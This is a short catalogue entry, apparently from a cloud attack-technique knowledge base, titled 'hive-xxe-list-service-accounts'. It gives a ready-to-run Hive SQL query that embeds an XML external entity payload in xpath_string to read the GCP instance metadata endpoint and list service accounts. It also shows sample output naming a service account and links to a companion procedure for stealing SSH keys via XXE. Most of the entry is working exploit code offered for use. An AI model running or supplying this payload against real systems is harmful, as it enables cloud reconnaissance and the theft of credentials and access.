---
id: uuid-c7
data: >-
  select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [
  <!ENTITY xxe SYSTEM
  "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/">
  ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5
tags:
  - xxe
  - enumeration
type: command
output: >-
  List of service accounts including
  781002931567-compute@developer.gserviceaccount.com/default/
executor: sql
platforms:
  - GCP
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:55.599Z'
verified: false
validated: true
submitted: true
---
# hive-xxe-list-service-accounts

## Command

```sql
select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5
```

## Description

Executes XXE to list available service accounts from instance metadata.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| SYSTEM | Service accounts endpoint | Yes |
| LIMIT 5 | Result limit | Yes |

## Examples

### Basic Usage

```sql
select xpath_string(...) FROM test LIMIT 5
```

## Expected Output

List of account paths.

## Related

- [[Related Procedure: Fetch-SSH-Keys-and-Metadata-via-XXE]]
